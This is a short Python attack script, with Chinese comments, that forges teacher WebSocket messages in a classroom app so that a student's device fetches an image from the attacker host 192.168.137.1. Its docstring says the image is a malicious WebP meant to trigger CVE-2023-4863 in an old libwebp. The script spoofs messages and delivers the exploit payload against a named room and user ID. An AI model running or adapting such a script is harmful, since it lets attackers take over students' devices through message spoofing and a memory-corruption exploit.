# -*- coding: utf-8 -*-
"""inject_doc_answer.py - 注入教师文档答案消息(type=1020007, simple_tea)
data = ImageAnswerBean 列表, onlineUrl 指向我们的恶意 WebP
目的: StuReadDocActivity 加载该图片 -> 系统 BitmapFactory -> 旧版 libwebp -> CVE-2023-4863
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"


def env(mtype, data, cid, tag, cmd=2):
    return json.dumps({
        "cmd": cmd, "ct": "", "from": "teacher", "gt": 0, "cId": cid,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
    }, ensure_ascii=False)


def inj(js, label, wait=8):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    # ImageAnswerBean: index / localPath / onlineUrl
    urls = [
        "http://%s/x.png" % OUR,
        "http://%s/poc.png" % OUR,
        "http://%s/img.webp" % OUR,
    ]
    for n, u in enumerate(urls):
        bean = [{"index": 1, "localPath": "", "onlineUrl": u}]
        inj(env(1020007, json.dumps(bean, ensure_ascii=False), "179PA%04d" % n, "simple_tea"),
            "type=1020007 onlineUrl=%s" % u, 8)
    # 备用: 教师批改答案(225)
    for n, u in enumerate(urls[:2]):
        bean = [{"index": 1, "localPath": "", "onlineUrl": u}]
        inj(env(225, json.dumps(bean, ensure_ascii=False), "179PB%04d" % n, "simple_tea"),
            "type=225 onlineUrl=%s" % u, 8)
    print("done", flush=True)


if __name__ == "__main__":
    main()
